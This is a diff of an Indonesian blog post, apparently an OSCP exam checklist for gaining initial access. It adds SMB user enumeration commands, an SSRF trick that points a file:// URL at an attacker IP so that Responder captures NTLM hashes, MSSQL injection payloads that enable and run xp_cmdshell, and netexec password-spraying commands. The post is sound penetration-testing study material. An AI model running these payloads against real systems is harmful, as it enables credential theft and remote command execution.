@@ -9,16 +9,16 @@ image:
   path: /images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all.png
 ---
 
-Pada dasarnya, menemukan Initial Access saat ujian OSCP tidak terlalu sulit.
+Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "enumeration game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidak terlalu sulit.
 
-Secara garis besar, maka hal apa saja yang mesti kalian ingat:
+Secara garis besar, maka hal apa saja yang perlu kalian ingat:
 - [FTP (21/tcp)](#ftp-21tcp)
 - [SMB (445/tcp)](#smb-445tcp)
 - [SNMP (161/udp)](#snmp-161udp)
 - [[Uncommon Services] Found Weird Port?](#found-weird-port-uncommon-services)
 - [Web Application (HTTP)](#web-application-http)
-- [Web Application: SSRF to Steal NTLM](#web-application-http)
-- [Web Application: MSSQL Injection to RCE](#web-application-http)
+- [Web Application: SSRF to Steal NTLM](#web-application-ssrf-to-steal-ntlm)
+- [Web Application: MSSQL Injection to RCE](#web-application-mssql-injection-to-rce)
 - [Found Numerous Unnecessary Files?](#found-numerous-unnecessary-files)
 - [Found Protected File? Crack It!](#found-protected-file-crack-it)
 - [Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials](#some-files-pdf-docx-zip-db-etc-might-contain-credentials)
@@ -86,7 +86,22 @@ netexec smb <TARGET> -u '' -p ''
 netexec smb <TARGET> -u 'guest' -p ''
 ```
 
-Dengan memanfaatkan 2 kerentanan tersebut biasanya kita bisa mendapatkan List Local User yang ada di dalam OS dengan menggunakan [enum4linux](https://www.kali.org/tools/enum4linux/).
+### SMB Enumerate Local User
+
+Dengan memanfaatkan 2 kerentanan tersebut biasanya kita bisa memperoleh beberapa Local User yang ada di dalam OS dengan menggunakan [enum4linux](https://www.kali.org/tools/enum4linux/).
+
+```bash
+# with null session
+enum4linux -a -v <TARGET>
+
+# with guest login
+enum4linux -u guest -p '' -a -v <TARGET>
+
+# with credential
+enum4linux -u <USERNAME> -p <PASSWORD> -a -v <TARGET>
+```
+
+![enum4linux SMB Users Enumeration](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-enum4linux-smb-users-enum.png)
 
 ### Other SMB Cheatsheet
 
@@ -134,8 +149,9 @@ snmpbulkwalk -c <COMMUNITY_STRING_NAME> -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExt
 
 ## Found Weird Port? (Uncommon Services)
 
-Google it.
+Tak jarang kita menemukan Port dengan angka yang tidak umum, bahkan service-nya tidak akan dikenali oleh NMAP. Tapi, jangan khawatir, kita bisa memanfaatkan Google untuk hal ini.
 
+Google it.
 ```
 port XXX exploit
 ```
@@ -171,7 +187,39 @@ Google it
 
 ## Web Application: SSRF to Steal NTLM
 
+Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.
+
+Untuk mengeksekusinya, kita perlu menghidupkan [Responder](https://github.com/SpiderLabs/Responder) terlebih dahulu pada mesin kita.
+
+```bash
+sudo python3 Responder.py -I tun0 -wd
+```
+
+Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test` dan boom! Responder kalian akan menangkap Request seperti ini.
+
+![SSRF in Responder](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder.png)
+
+Lalu, coba crack NTML-nya.
+
 ## Web Application: MSSQL Injection to RCE
+
+Karena SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, kita dapat melakukan escape dan menjalankan query lain. Contohnya seperti ini:
+- `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`
+
+Enable "xp_cmdshell":
+
+```sql
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+```
+
+Exec "xp_cmdshell":
+
+```
+';EXEC xp_cmdshell "whoami";--
+```
 
 ## Found Numerous Unnecessary Files?
 
@@ -200,3 +248,17 @@ You need to crack it.
 ## Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials
 
 ## Credential Spraying - FTP, RDP, SMB, SSH, and WinRM
+
+[Netexec](https://github.com/Pennyw0rth/NetExec) adalah tool yang sakti, di mana kita bisa melakukan Credential Spraying ke berbagai layanan seperti FTP, RDP, SMB, SSH, dan WinRM, bahkan dengan berbagai metode yang berbeda.
+
+```bash
+netexec winrm <TARGET> -u username.txt -p password.txt
+netexec winrm <TARGET> -u 'john' -p password.txt
+netexec winrm <TARGET> -u username.txt -p 'Password123'
+```
+
+Kita dapat mengubah "winrm" dengan:
+- ftp
+- smb
+- rdp
+- ssh
